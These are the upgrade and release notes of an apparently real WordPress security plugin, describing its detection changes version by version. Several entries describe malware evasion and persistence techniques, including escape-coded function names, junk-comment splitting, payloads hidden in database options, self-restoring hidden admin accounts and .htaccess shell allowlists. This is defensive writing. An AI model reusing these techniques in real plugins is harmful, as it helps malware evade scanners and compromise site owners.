# Upgrading WP Perf Shield

Release notes for operators. What changed, what to check afterwards, and what to do about anything WP Perf Shield reports.

## Parked: must-use tamper protection (withdrawn 1.4.15)

The tamper guard is gone. It is written up here rather than deleted quietly, because the idea was worth having and someone - possibly me, later - will be tempted to build it again.

**What it did.** A must-use plugin installed at `wp-content/mu-plugins/0-wps-guard.php` loaded before ordinary plugins and checked that WP Perf Shield was still in the active list. If something had removed it, the guard put it back and recorded what happened, so that malware disabling the scanner could not do so silently. Deliberate deactivation was respected through a signed consent record, and the signing key lived beside it in a dot-prefixed file.

**Why it was withdrawn.** It caused two outages on a production site in one week.

The second one is the instructive one. If the signing key file went missing - which is exactly what a backup, migration or sync tool that skips dot-files does - the expected-state record could never verify. The guard treated that as tampering and recorded it, correctly, on every single request, because the condition is permanent rather than momentary. The plugin then imported that spool by reading the whole file into memory and writing one tamper-evident audit entry per line. Enough traffic, and the site returned a blank page.

The first fix was incomplete: it throttled the one path behind the outage and left three others writing on every request, and its size cap read a cached `filesize()` that could never fire. That was only found by measuring the worst case under sustained load, which is a thing the feature should have shipped with.

**The real reason, which is not the bug.** A must-use plugin is the one component an operator cannot switch off from the dashboard. That is precisely what made it useful against malware, and precisely what made a fault in it so expensive: the ordinary remedy - deactivate the plugin - was unavailable, and the fail-safe added in 1.4.12 could not help either, because a must-use plugin loads before the plugin that would catch it. A component with no off switch has to be held to a much higher standard than the rest of the codebase, and this one was not.

**What would have to be true before it returns.**

- Every write path bounded at the single point they all pass through, never at individual callers, and proved by a sustained-load measurement rather than a single-request test.
- Its own crash handler, independent of the main plugin's, so a fault in the guard disables the guard rather than the site.
- A documented recovery route that works without database access or FTP, since the operators most likely to need it are the least likely to have either.
- Its dependencies must not include anything that ordinary hosting tooling silently discards. Keying the whole feature on a dot-file was the original sin, and it was invisible until a restored site proved it.

Until all four hold, the plugin does without tamper protection. Losing a detection capability is a smaller cost than a security tool that can take a site down and cannot be switched off when it does.

## Forward notes - what is coming, and what it will mean at upgrade time

The full programme, sequencing, and gating decisions live in `doc/ssot.md` under "Product Roadmap - EDR Programme". This section carries only what an operator will actually notice when upgrading through the coming releases.

**Scanner restructuring.** The detection engine is one class of roughly 7,300 lines carrying 55 separate checks, and it wants splitting into grouped classes along a seam that already exists. This is internal work: detection output should be byte-for-byte what it was, and that equivalence is the thing the release will have to prove. If you call `WPS_Scanner` methods from your own code, the documented entry points stay put; anything undocumented you reached into may move.

**Internationalisation.** The plugin currently has no text domain and no translatable strings - every message is hard-coded English. Wrapping them changes no behaviour and no English output; it simply makes translation possible. Worth knowing only because it touches a very large number of files at once.

**Behaviour baselines (EDR Phase 2).** Login history with devices you can mark as trusted or revoke, and a per-administrator baseline of the pages, hours, addresses, and browsers normally seen, with alerts when activity departs from it. Expect more incident rows than you see today, and expect the first week to be noisier while a baseline exists but has little to compare against. Observations only, as ever.

**Integrity and session summaries (EDR Phase 3).** File-integrity monitoring across a defined set - `wp-config.php`, `.htaccess`, `mu-plugins`, the active theme, plugins, `functions.php` - reported as modified, added, or deleted. A baseline is recorded when you upgrade, so anything you change afterwards is what gets reported. Also a session summary at logout, and persistence detection at the moment it happens rather than at the next scan.

**Classification (EDR Phase 4).** Naming what an incident was - brute force, credential stuffing, privilege escalation, persistence, reconnaissance - with MITRE ATT&CK technique mapping, correlation of plugin-installation chains, and joining server access-log lines to recorded events by time and address.

**Visualisation (EDR Phase 5).** A filterable timeline, incident replay as a chronological narrative, and a one-page summary per critical incident.

### Decisions that are still open

Three features stay dormant until a decision is recorded, because each changes what the plugin does with your data or your site:

- **Geolocation.** Impossible-travel detection and first-seen-country scoring need a GeoIP source. The options are bundling a database (tens of megabytes, licence terms, an update mechanism to maintain), calling an external lookup service (this plugin currently makes no third-party network calls at all, and that would reverse it), or continuing without. Until decided, the country, city, and network fields stay empty and the dependent scoring stays off.
- **Session fingerprinting.** Detecting a stolen session cookie means collecting a client-side fingerprint across wp-admin generally, not just this plugin's own screens. Off until approved.
- **Deception.** Honeypot administrator accounts and a decoy upload endpoint are parked indefinitely. A honeypot account writes to your users table and a decoy endpoint accepts uploads by design; both change the plugin's risk posture rather than only its detection, so neither proceeds without explicit item-level approval.

### A note on sequencing

Take the order above as intent rather than a schedule. Between 1.4.1 and 1.4.6 six consecutive releases came out of analysing live samples from infected sites, and each one pushed the planned work back. That is deliberate: a confirmed blind spot in detection beats a planned feature every time. If samples keep arriving, the roadmap keeps moving, and the changelog will say so plainly when it does.

### What will not change

Behavioural findings are observations and are never auto-remediated - only content-confirmed malware is removed automatically, and removals go to quarantine where they can be recovered. Nothing calls out to a third party without a decision recorded in the SSOT first. Deactivating WP Perf Shield from the Plugins screen always works and always will.

*(Corrected in 1.4.48: this paragraph previously went on to say that a tamper guard would restore the plugin if something removed it. That guard was withdrawn in 1.4.15, and is written up at the top of this file. 1.4.44 corrected the same claim in `readme.txt` and `doc/readme.md` and missed this copy, so the promise stood for four further releases. WP Perf Shield does not restore itself, and malware that disables it succeeds silently.)*

## 1.4.87

**Strengthens detection of the fake "performance" plugin family against simple evasion.** Testing found that two small changes an attacker could make in minutes - tidying up the deliberately broken-up code, and moving the hidden payload into a separate file - would together have slipped past the previous version, even though each change on its own was caught.

The check now looks for what the plugin actually *does* - reading its hidden code out of a WordPress option, decoding it, and running it - rather than for how that code happens to be packaged. Where the payload physically sits no longer matters.

**Nothing to configure**, and legitimate plugins that store or decode settings in options are unaffected. Worth a fresh scan after upgrading.

## 1.4.86

**These fake plugins now hide their payload in your database, not just in their own files.** Three more of the random-suffix "performance" plugins arrived, and all three were already being caught - but they have changed something important: the code they run is stored in a WordPress option, and the plugin writes it back whenever it goes missing.

**This changes how you clean up.** Deleting the plugin folder removes the loader and leaves the payload in your database, waiting for the next one. The scan now names the option and quarantines it along with the folder, so removal is complete. If you have deleted one of these plugins in the past and moved on, it is worth running a fresh scan.

## 1.4.85

**Akismet now hears about spam comment authors and about who planted malware.** Two things were going unreported. Confirmed gambling and SEO-spam comments carry the sender's address, and that is exactly what Akismet is for - those senders are now reported. And when a scan confirms malware, the plugin checks its own records for an address that was blocked on your site while that file was being written, and reports it with the timing as evidence.

**It will not guess.** A malware file with no matching address in your records is not blamed on anybody, because a wrong report harms an innocent address on every site that uses Akismet. Only addresses already blocked for hostile behaviour are considered, only one is blamed per file, and ranges are never submitted.

**Nothing to configure** - your existing "Report attackers to Akismet" setting governs all of it, and turning it off stops everything.

## 1.4.84

**Fixes a blind spot against packed backdoors that hide their strings in escape codes.** A real sample - 76KB on four lines, 121 `goto` jumps, sending data out through a Telegram bot - was read as clean because the words that would have proven what it does were written as `\x65\x76\x61\x6c` rather than as text. The check now resolves those escapes before judging, and additionally flags a messaging-bot or webhook address that has been deliberately hidden in a file which is already obfuscated.

**Nothing to configure.** If earlier scans came back clean, this class of file was invisible to them, so a fresh scan after upgrading is worthwhile.

## 1.4.83

**A plugin you did not install is now treated as a break-in, not as clutter.** WP Perf Shield keeps a record of plugins that arrive through the dashboard or WP-CLI, and reports any plugin folder that appears by neither route - regardless of whether its code is clean. An intruder's first move is often to install a real, working tool such as a file manager, precisely because it looks innocent and matches no malware signature.

**The first scan after upgrading is silent.** It adopts the plugins you already have as the starting point, since it cannot know which of them you installed yourself. Anything appearing after that is reported once.

**It does not delete anything** - you may have installed something by SFTP, and that is legitimate. If a report does appear, treat the folder date as roughly when someone got in: check for accounts created or promoted around then, review your access logs for that window, and change all administrator passwords and rotate your salts.

## 1.4.82

**Backdoors found in your uploads folder are now removed, not just reported.** The check that finds encoded payload loaders identified them correctly but left them on disk, so a live backdoor could be sitting in a scan report while still running. It now removes them like every other check of that severity.

**Removal is quarantine-first and reversible**, and it deliberately removes only the offending file rather than the folder around it, since these are usually planted among legitimate files in uploads. Your auto-delete and quarantine settings still govern the behaviour. Worth a fresh scan after upgrading.

## 1.4.81

**Detects hidden administrator accounts - the kind that come back after you delete them.** A scan now flags code that creates an administrator and then hides it from the Users screen and the REST API. One sample presented itself as a backup plugin, wrote its credentials in escape codes so they could not be searched for, and recreated the account on every page load.

**If a scan reports this, the order matters:** remove the flagged code first, then delete the account, then change every remaining administrator password and rotate your salts. Deleting the account first achieves nothing - the code puts it straight back, which is why such accounts seem to return by themselves.

**Also fixes** a loader that hid its payload after the closing PHP tag rather than in a string, which earlier versions read as clean. Worth a fresh scan after upgrading.

## 1.4.80

**Detects two more techniques from the campaign already covered in recent releases.** First, code broken apart with junk comments - `diE//junk` then `(INclUde_onCE//junk` - which runs normally but cannot be found by searching for what it does. Second, tiny plugins whose only purpose is loading a script from someone else's server into every page of your site, typically installed under a near-miss spelling of a real plugin's name.

**One thing to be aware of if a scan flags this.** This family plants files inside genuine, unmodified plugins - one sample was a real Automattic plugin with two files added to its `assets/` folder. So a finding does not mean the whole plugin is fake. The finding removes the planted file and tells you to check the rest of that folder against the official version rather than assuming either way.

**Also fixes** a case where a malicious plugin escaped detection by splitting its payload handling across two files, each of which looked harmless alone. Worth a fresh scan after upgrading.

## 1.4.79

**Detects a family of fake plugins that hide their payload in data files.** These install under believable names with a random four-character suffix - `native-layout-manager-d7f2`, `starter-render-enhancer-d5b7`, `auto-resource-analytics-4d22` - and keep almost no code in their PHP files, so a scan that reads code sees nothing wrong. A scan now flags them two ways: by the payload sitting in an opaque data file the plugin loads and runs, and by identifiers being split into pieces (`'wp_'.'foot'.'er'`) so that searching the file for them finds nothing.

**One of them rebuilds itself if you delete the PHP.** It keeps an encrypted copy in a data file and writes the PHP back on the next page load. The finding says so, and targets the whole folder for removal rather than the file.

**Worth a fresh scan after upgrading**, and worth looking through your plugins list for anything with a random four-character suffix on the end of a plausible-sounding name. Nothing to configure.

## 1.4.78

**Fixes two blind spots that let a real backdoor through.** A planted loader inside a legitimate file-manager plugin - buried seven folders deep in its own uploads area, and chaining four decode layers - was not being detected. The scan stopped five folders deep, and two of the decode functions it used were not on the list the check counts. Both are fixed: the payload scan now walks deeper, and transport decoders like `urldecode` count as layers.

**Nothing to configure**, and no new settings. If you have run a scan before and it came back clean, it is worth running once more after upgrading: this class of file was invisible to earlier versions.

## 1.4.77

**Detects plugins that hide themselves from you.** A scan now flags any plugin that removes its own entry from the Plugins list, or that shows its front-end output to visitors while withholding it from administrators. Neither has a legitimate use, and together they are how an injected plugin stays invisible to the person running the site while serving spam or scripts to everyone else. Caught structurally, so a variant that rewrites its payload is still found.

**Also adds signatures** for the VeyronHacklink backlink-injection family (which self-promotes into mu-plugins to survive deletion) and for two unauthenticated PHP file managers found dropped inside a fake "WPForms Iite" plugin - a homoglyph typosquat using a capital I in place of the L.

**Nothing to configure.** If a scan flags one of these, remove it and then look for how it was installed: a rogue administrator account, other mu-plugins, or PHP under wp-content/uploads.

## 1.4.76

**Finds web shells hidden by .htaccess rules, where no PHP file has been modified at all.** A scan now flags any `.htaccess` that blocks PHP while allowlisting specific PHP filenames WordPress does not ship - a persistence trick that looks like hardening but exists to keep an attacker's shells reachable after everything else is blocked. It reports every allowlisted filename, which is effectively the attacker's own list of where their shells are.

**It will not flag ordinary hardening.** A plain `Deny from all`, a WordPress-only allowlist, and the standard WordPress rewrite rules are all left alone; the trigger is specifically an allowlist naming files WordPress and its plugins do not ship. Nothing to configure.

## 1.4.75

**Banned plugins are now removed, not just blocked.** WP File Manager and FileBird were already refused on upload and activation and deactivated if running, but the files stayed on disk - still reachable, still carrying whatever got them banned. A scan now finds an installed banned plugin and removes it.

**It is quarantined first, so this is reversible.** If a removal was not what you wanted, restore it from Diagnostics; to keep a plugin permanently, remove its slug under Settings then Banned plugins before the next scan. Removal honours your auto-delete setting, and switching the banned-plugins list off stops it entirely. Matching is by exact folder name, so a different plugin with a similar name is never touched.

**If you are running WP File Manager deliberately, act before you upgrade** - otherwise the next scan will quarantine it.

## 1.4.74

**Detects a specific live web-shell family found this session: "Dark X7ROOT File Manager", dropped as the root `index.php` of an otherwise genuine plugin folder.** A scan now catches it two ways: by its self-identifying signature, and - more durably - by the disguise technique itself, since every real plugin's index.php files at every folder level are near-empty stubs and this one is not. The structural check works even against a variant that changes its content entirely. Nothing to configure; runs as part of the normal scan.

## 1.4.73

**Finds injected casino/gambling/SEO-spam posts and comments - and catches new ones as they are published.** If posts you did not write have appeared (the "slot gacor / togel / casino" spam), a scan now finds them and lists their IDs, and any future injection is flagged the moment it lands, whatever published it. It is careful not to flag your own writing: a post has to carry SEO-spam tokens, or stuff gambling keywords alongside hidden markup, before it counts - an ordinary article that mentions gambling or judi is left alone.

**It does not delete anything.** Deleting the spam without first closing the entry point just lets the injector republish, so the finding tells you to find the entry point first (run a full scan, check for a rogue admin, mu-plugins, PHP under uploads, and a modified theme functions.php), then remove the content, then harden. Nothing to configure.

## 1.4.72

**Known-bad addresses now serve longer blocks across all the guards.** The login guard already weighted its block duration by Akismet reputation; that now extends to the others. A malware-uploading address Akismet also knows as bad is held thirty days instead of seven. And a *sustained* external-post-injection campaign (ten or more blocked writes from one address in an hour) escalates from a per-request refusal to a persistent block — one day, or seven if the address is known-bad. The threshold is deliberately high so a stray request never trips it, shared-infrastructure/CDN addresses are never escalated, and it all respects your hostile-IP auto-block switch. Nothing to configure; no new settings.

## 1.4.71

**Malware-upload and post-injection attackers are now reported to Akismet too.** Previously only failed sign-ins fed Akismet; now an address caught uploading malware or injecting posts through the REST API is contributed as well, through the same safeguarded path — never a CDN/proxy address, never a whole range, once per address. Governed by the existing "Report attackers to Akismet" switch; no new setting, and nothing to do. Also a general tightening pass (lint, autoload, settings and event-severity consistency); no behaviour changed beyond the Akismet wiring.

## 1.4.70

**New: block external post creation (auto-blogging / SEO-spam injection).** WP Perf Shield can now refuse post writes that come through the REST API or XML-RPC from anything other than a real dashboard session - the route auto-bloggers and doorway-spam injectors use with Application Passwords, Basic Auth, or no auth at all. Blocked attempts are logged so you can see them.

**Off by default, and read this before turning it on.** It will break headless WordPress, mobile-app posting, and Zapier/IFTTT-style integrations that publish through the API. Enable it under Settings only if nothing legitimately posts to this site from outside the dashboard. Dashboard publishing (Gutenberg, Classic Editor) and scheduled posts are never affected. If you were running the standalone Block External Posting plugin, deactivate it once this is on.

## 1.4.69

**Documentation only — nothing to do.** The in-plugin Docs reference and the readme description had fallen behind the features added since 1.4.61; they are now current. No behaviour changed.

## 1.4.68

**One-click permanent range ban.** Diagnostics has a new field to permanently block an address or a whole range (e.g. `173.239.218.0/24`). This is the deliberate forever-ban the automatic seven-day range ladder deliberately stops short of. It refuses any range that holds your own or a recent administrator address, and refuses anything broader than a /16, so you cannot lock yourself out or ban half the internet by mistake. Remove entries any time from the same screen.

**Report every blocked address to Akismet (new default).** Reporting previously fired only on conclusive evidence and held back a first-offence single-username block as a possible mistyped password — which is why your posture showed many blocks and zero reports. It now reports every blocked address, and the individual attacking members of a blocked range.

**Read this before trusting the new default.** This is more aggressive than the plugin was, and the maintainer's advice was against it: everything Akismet learns is shared with every site that queries it, so a wrongly-blocked address (a real person who mistyped a password) is degraded everywhere, not just on your site. You asked for it and it is your call; it has an off switch under Settings → "Report every blocked address". Two safeguards were kept and are not optional, because they harm third parties who are neither the attacker nor you: a CDN/proxy address is never auto-reported, and a whole range is never submitted to Akismet — only the specific addresses that actually attacked from it, so innocent neighbours in a shared range are not flagged. Each address is reported at most once.

**Nothing else to do.** If the attack has been from `173.239.218.0/24`, banning that range by hand now ends it immediately rather than waiting for the ladder.

## 1.4.67

**Repeat attacking ranges now get progressively longer blocks.** A rotating /24 used to be held six hours, then it was free to return. Now a range that re-offends climbs a ladder — 6 hours, 24 hours, 3 days, 7 days — over a fortnight's memory, so a persistent subnet locks itself out for longer every time it comes back. It stops at seven days on its own; a permanent ban of a whole range stays your manual call, since a /24 can hold innocent people. Your allowlist and recently-used admin addresses are still never blocked.

**The Security posture panel now reconciles.** If you saw "624 addresses blocked" next to "4 range rotation" and read it as the plugin doing nothing, that was the panel's fault, not the engine's: it was hiding the hundreds of single-address blocks. The "blocks by rule" line now shows all four categories so the numbers add up, and notes that a range block covers every address in the /24.

**Nothing to configure.** If the same networks have been hammering you, they will now spend days locked out instead of hours.

## 1.4.66

**Closes the XML-RPC amplification vector, safely.** XML-RPC sign-ins already went through the login guard — a blocked address or range is rejected on `xmlrpc.php` just as on the login form, and a failed XML-RPC sign-in counts toward the rotation rules like any other. The one gap was `system.multicall`, which lets a single request carry many credential guesses. The plugin now strips `system.multicall` **on by default**, while leaving normal XML-RPC sign-in working.

**This does not break Jetpack or the mobile apps** — they authenticate through direct methods, not `system.multicall`. If you rely on a tool that deliberately batches calls through `system.multicall`, you can switch it off under Settings → XML-RPC multicall. The separate "disable XML-RPC sign-in entirely" toggle is unchanged.

**Nothing to do.** The subnet rotation from 1.4.65 still blocks the `173.239.218.0/24` attacker on the fifth distinct address; this release just makes sure the same crowd cannot get more mileage out of `xmlrpc.php`.

## 1.4.65

**Stops low-and-slow subnet brute-force.** If you have seen a run of failed sign-ins from many different addresses in the same block (e.g. `173.239.218.x`), spaced several minutes apart so nothing ever got blocked, this closes that gap. The login guard now treats **rotation itself** as the signal: five distinct failing addresses in one /24 within an hour blocks the whole range, regardless of how slowly the attempts are paced. It holds such a range for six hours.

**It cannot lock you out.** A range containing your allowlist or any address you have signed in from recently is never blocked, and a single address failing many times (you, mistyping a password) never triggers a range block — that still needs rotation across several addresses, which one person cannot produce.

**After upgrading, the block builds from live traffic.** The counter starts fresh, so the range is blocked once five distinct addresses in it have failed within the hour — for the attack in the logs, that is roughly the next handful of attempts. If you want the range gone immediately rather than on the next trip, block it by hand from Diagnostics. **Nothing to configure**; the network guard is on by default and still has its off switch.

## 1.4.64

**New: verify the event-log fix from inside the plugin.** Diagnostics now has an **Event-chain self-test** button. It proves the 1.4.63 concurrency fix against your own database, on your own server — no WP-CLI or shell scripts needed. It runs the real append code over a throwaway scratch table (the real chain is never touched, and the test checks that afterwards), and it opens a second database connection to prove the append lock actually excludes across connections. Green means the fix holds on this host.

**Run it once on staging after upgrading**, especially if you saw the chain-verification failure this line of work was chasing. If the exclusion check reports "not applicable", your database has no `GET_LOCK` and the append is using its `FOR UPDATE` fallback — note it and mention it to the maintainer.

**Nothing else changed, and there is nothing to configure.** The self-test only runs when you click it, and it writes one audit line recording its own verdict.

## 1.4.63

**Fixes a false tamper alarm in the event log (CRIT-005).** If you have seen an unexplained "chain verification failed" report on a busy site, this is the likely cause and the likely fix. The tamper-evident log's append was not concurrency-safe: two requests arriving together could both attach to the same point in the chain and fork it, and the verifier — correctly — flagged the fork as tampering. The append is now serialised with a database lock, and the chain head is read from the table rather than a cached value, so the race is closed and a previously-forked cached head can no longer mislead new writes.

**This is preventive, not a repair.** It stops new forks. It does not un-fork a chain that already forked before you upgraded. After upgrading, re-run chain verification from the Events tab: if it still reports a failure, the `first_bad_id` it names is the historical fork point, and re-anchoring that is a separate step — raise it with the maintainer rather than assuming the fix did not work.

**Before trusting it on production**, the change should be verified against a real database under concurrency on a staging clone (`harness/crit005-concurrency.sh`); the build-time checks cover the logic but not live parallel writes. **Nothing else changed**, and there is nothing to configure.

## 1.4.62

**New: a banned-plugins list, separate from malware blocking.** WP Perf Shield can now refuse ordinary plugins you have decided not to run, distinct from the malware it already blocks. Two ship banned on upgrade: **WP File Manager** (full dashboard filesystem access, with a history of critical remote-code-execution holes) and **FileBird**. From the moment you upgrade, neither can be uploaded or activated, and either is deactivated if it is currently running.

**If you are deliberately running one of these**, the upgrade will deactivate it. That is the feature working. To keep it: go to Settings → Banned plugins and either untick "Enforce the banned list", or — better — remove just that slug's effect by turning the list off, reactivating the plugin, and leaving the rest in place. There is no per-slug exception for the two built-in defaults; if you need one banned but not the other, tell the maintainer and it becomes a small change.

**These are policy refusals, not malware alerts.** They appear in the event log at *warning* severity, worded as site-policy decisions. Nothing about them touches the hostile-IP block list — uploading a banned plugin never gets your own address blocked.

**To ban your own plugins**, add one folder slug per line under Settings → Banned plugins → Additional banned slugs.

**Otherwise, nothing to do.** If you were not running WP File Manager or FileBird, this upgrade changes nothing you will notice.

## 1.4.61

**No functional change.** Detection, blocking, remediation and settings are exactly as they were in 1.4.60.

**What is new is a document.** The Docs tab now opens with a remediation roadmap: which security-review findings are fixed, which are outstanding, and what happens next. If you want to know where this plugin currently stands on the review it is undergoing, that is the page.

**Two corrections to what 1.4.60 told you.** The per-check status work described there covers one function, not the whole scanner — a check that fails can still be indistinguishable from one that found nothing. And the message telling you that a manual scan will run the checks a timed-out scan skipped is still there and still wrong; a manual scan runs the same checks in the same order. Both are named in the roadmap as the next work.

**Nothing to do.**

## 1.4.60

**Read this one.** An external security review found three defects that affected whether WP Perf Shield protected you at all. Two are fixed here; all three are described honestly.

**The plugin-integrity check was not working.** WP Perf Shield compares your installed plugins against the official WordPress.org copies to catch malware injected into a legitimate plugin. Because of a one-character mistake, that check never examined a single file — it reported "nothing wrong" every time, including on a plugin with a backdoor planted inside it.

It works now. **If you have been relying on clean integrity results, treat them as never having been checked, and run a scan.**

**Automatic remediation could delete files it should not have.** When quarantine failed — a full disk, a permissions problem — the plugin fell back to deleting the file outright. A quarantine failure means something is wrong with the machine, not that destroying the file is safe, and the files most likely to be deleted wrongly were the ones least likely to be genuinely malicious.

Now, if quarantine fails, nothing is deleted. The file is left exactly where it is, the finding stays open, and you are told which directory to check. Deletion still happens normally if you have deliberately switched quarantine off.

**Scans could run on top of each other.** The hourly scan, a manual scan and a post-upgrade scan could all run at once, each able to quarantine or delete. Only one scan can run at a time now.

**Akismet is unchanged.** Reporting attackers is still on by default, as intended. A comment in the source wrongly described it as opt-in, which is corrected. Separately, a second Akismet setting — whether to *ask* Akismet about an address when deciding how long to block it — was being read but had no control, so it could never be turned off. It now has one, still on by default. Asking Akismet a question sends nothing about your site; that is the reporting setting above it.

**What is still outstanding.** Two critical findings are not fixed in this release: scans can still skip the same late checks indefinitely on slow hosts, and the tamper-evident event log can fork its chain when two events are written at the same moment. That second one is the likely explanation if you have ever seen an unexplained chain-verification warning. Both are next.

## 1.4.59

**No code changed.** Detection, blocking and settings are all exactly as they were in 1.4.58.

**What changed is the bundled variant catalogue.** A supplied sample confirmed an existing entry precisely, so that entry is now marked as verified from a file rather than recorded from notes.

**And the catalogue now admits what it does not have.** Seventeen of the thirty-four samples it fingerprints carry only an older-style fingerprint, and one carries none. That is published in a new appendix rather than left for a reader to assume otherwise.

If you are wondering whether that weakens protection: it does not. Changing a malicious file changes every fingerprint of it at once, so having one rather than two is no easier to evade. What it affects is how strongly an analyst can corroborate an identification, which is why it is documented rather than hidden.

## 1.4.58

**Nothing to do.** File fingerprints for one more sample of a malware family WP Perf Shield already blocks and already detects.

The sample was blocked at installation and rejected at upload before this release, because since 1.4.50 this family is recognised by the shape of its folder name rather than by a list. The fingerprints add one more way to catch a copy that has been renamed to something the pattern does not recognise.

**Three of the four known members of this family are now confirmed from files examined directly** rather than recorded from earlier analysis. The variant catalogue marks which is which.

## 1.4.57

**Nothing to do.** This release adds file fingerprints for one more sample of a malware family WP Perf Shield already blocks, and fixes an error in the bundled variant catalogue.

**Worth knowing.** The new sample was blocked at installation and at upload by a version of the plugin that had never encountered it. Since 1.4.50 this family is recognised by the shape of its folder name rather than by a list of known names, because it generates a new name for every copy. This is the first confirmation that the approach works on a member it was not shown.

**The catalogue correction.** The variant catalogue listed two members of this family. Four were known — two of them recorded only in code comments during the original analysis. They are now listed, and the check that keeps the catalogue honest has been extended so it can see samples named in comments, not just entries in lists.

## 1.4.56

**If you run any crypto, NFT or wallet plugin, this release matters to you.** WP Perf Shield treated several public blockchain endpoint names, and the `eth_call` method name, as malware signatures on their own. Any legitimate plugin that talks to a blockchain contained those strings, so it would have been reported as critical malware and offered for removal.

That is fixed. Those names still contribute to detection, but no longer on their own — something else has to be wrong with the file too.

**What is new.** Some malware now stores the address of its control server on a public blockchain rather than in its own code, so the operator can move servers daily without touching the thousands of sites they have infected, and there is no domain to block. WP Perf Shield now recognises that pattern by its shape rather than by a list of known addresses, which means it catches versions nobody has seen yet.

**A note on what this plugin has been fighting.** Security researchers at Sekoia published an analysis of a paid malware service called ErrTraffic. It names a blockchain contract that has been recorded in WP Perf Shield's source since the very first version of this work. They are the same. The campaign that prompted this plugin is a commercial product with subscribers, support, and a price list.

**Nothing to do.** No settings changed, and detection of everything previously found is unchanged.

## 1.4.55

**Read this one if you have ever used the Hardening tab.**

**What was wrong.** Every time WP Perf Shield edited `wp-config.php` — adding a constant, cleaning malware out of it, rotating salts — it first saved a copy next to the original called `wp-config.php.wps.bak`.

That copy is not a PHP file, so a web server does not run it. It sends it. Anyone who requested that filename got your database name, username and password, your table prefix, and all of your authentication salts.

**What to do now.** Upgrade, then run a scan. Any such file still on your site will be reported as critical, with its location.

If one is found, assume the contents have been read. Deleting the file is not enough on its own:

1. Delete the backup file (or move it outside your web root).
2. Change your database password, and update `wp-config.php` to match.
3. Rotate your salts — Hardening, then Rotate salts. This logs everyone out, including any attacker holding a stolen session.

If no such file is found, there is nothing to do. Not every installation will have one; they were only created when a hardening action edited the file.

**What changed going forward.** Backups now go into quarantine, where they are not web-accessible and can be restored from the Quarantine card under Forensics. If quarantine is switched off, wp-config edits are now refused rather than performed with an unsafe backup, and the message tells you why.

**The scan also finds other people's.** Files like `wp-config.php.bak`, `wp-config.php~` and `wp-config.old` are left behind by editors, hosting control panels and developers, and they leak exactly the same way. Those are reported too.

**A second, quieter bug.** Saving the Settings tab was wiping the Content-Security-Policy configuration, because both live in the same stored record and the save replaced all of it. If you set up CSP and later found it switched off without touching it, that is why. Fixed — saving one tab no longer disturbs another.

## 1.4.54

**What this adds.** WP Perf Shield now has an icon. You will see it beside the title at the top of the plugin screen.

It is a shield containing three ascending bars. The shield says what the plugin is; the bars say where it came from, since this plugin exists because malware kept impersonating performance plugins and the name still carries that.

**Why it needed doing.** The technology-profiler submission prepared in 1.4.52 requires an icon, and there wasn't one to submit — the plugin had shipped fifty-odd releases without a mark of its own.

**Nothing else changed.** No settings, no detection, no blocking. If you would rather not see it, it is a single image in the page header and hiding it takes one CSS rule targeting `.wps-app-mark`.

**If you are submitting the plugin to Wappalyzer or a similar directory,** use the shipped file at `assets/img/wp-perf-shield.svg` rather than redrawing it, so the two copies cannot drift. `doc/wappalyzer-submission.md` has the details.

## 1.4.53

**What this completes.** One malware variant, `auto-asset-helper`, was blocked by name and by folder pattern but had no file fingerprints on record. 1.4.49 left that gap on purpose: the sample was not available, and inventing a fingerprint would have looked like protection while matching nothing.

The sample has now been examined, so the fingerprints are in and the variant is covered on every layer.

**Nothing to do, and nothing to notice.** This variant was already detected by six checks and already blocked at activation and upload. The addition matters for one case: a copy that has been renamed to something the pattern does not recognise is now caught by its fingerprint instead.

**The bundled variant catalogue** has been updated accordingly, and this entry moves from *Catalogued* to *Verified* — meaning the sample was examined directly rather than recorded from earlier analysis.

## 1.4.52

**What this adds.** An optional setting, under **Settings → Public identification**, that lets tools like Wappalyzer and BuiltWith recognise that your site runs WP Perf Shield. It emits one line into your pages:

`<meta name="generator" content="WP Perf Shield" />`

**It is off by default and you do not have to turn it on.** Nothing changes unless you tick the box.

**Why you might not want to.** Turning it on tells anyone looking at your site which security plugin is watching. If you would rather an attacker had to find that out the hard way, leave it off — that is why it ships off.

**Why the version is never included.** Each release tends to close a particular evasion technique. Publishing that you run version 1.4.49 rather than 1.4.52 would tell someone exactly which tricks still work against you. The tag carries the name and nothing else, and there is no option to add the version, because there is no version of that idea that is safe.

**If you turn it on and then want it gone from one template**, either untick the box or drop this into your theme:

```php
remove_action( 'wp_head', [ 'WPS_Public_Marker', 'render' ] );
```

**Getting listed.** Emitting the tag is only half of it — the profiler also needs a fingerprint on file. `doc/wappalyzer-submission.md` in this release has the submission routes and the exact JSON, ready to send.

## 1.4.51

**What this adds.** A new bundled document, the variant catalogue, reachable from the Docs tab. It lists every malware family WP Perf Shield recognises, with what each one does, the indicators that identify it, which checks find it, whether it is stopped before it runs, and what removing it actually requires.

It is written for whoever has to deal with an infected site, which may well be you. If a finding names something and you want to know what it is, that is the page.

**Why it might matter to you even if you never read it.** Building it surfaced two families that existed in WP Perf Shield only as comments beside a hash, and one blocklist entry that was the wrong length and could therefore never match anything. Both are fixed.

**Nothing changed about detection or blocking**, apart from removing that dead entry. No settings, no behaviour, no upgrade steps.

**If you publish or share the catalogue,** note that one family is keyed per victim site and the affected domains are named, because the keying is the family's defining property. Those are the maintainer's own properties. Consider whether naming them suits your context before republishing.

## 1.4.50

**What this fixes.** A piece of malware WP Perf Shield already recognised - it hides a large block of obfuscated JavaScript inside a PHP plugin, writes it into your active theme as `css.js`, and injects a script tag on every page - could still be installed. It was found on the next scan and flagged critical, but nothing stopped it arriving.

It is now blocked at upload and at activation.

**Why it needed different handling.** Every other blocked variant has a name to match. This one generates a new one each time, in the form `Plugin-` plus eight hex digits, so there is nothing fixed to list. WP Perf Shield now recognises the form itself, along with the file's fingerprints and a distinctive marker inside it.

**Could this block something of yours?** The pattern is deliberately narrow: exactly eight hexadecimal digits after `Plugin-`, nothing more and nothing less. A plugin called `plugin-directory`, `my-plugin-helper`, or `Plugin-scheduler` is unaffected, and so is any plugin that legitimately loads JavaScript from your theme. If you do somehow have a plugin whose folder is literally `Plugin-` followed by eight hex digits, it will be refused - and it is worth looking at closely before you decide that is wrong.

**Nothing to do.** If this malware is already installed, it was being detected before and still is, now by five checks rather than four.

## 1.4.49

**What this fixes.** Two pieces of malware WP Perf Shield already recognised could still be installed. It would find them on the next scan and flag them at critical, but nothing stopped the plugin being activated or the ZIP being uploaded in the first place. That gap — between something being dropped on the site and the next scan running — is time the payload spends working.

Both are now blocked at activation and at upload, in the folder shape they actually arrive in. These campaigns randomise the folder name (`site-security-toolkit-1f30`, `auto-asset-helper-2763`), so the patterns match the randomised form, not just the base name.

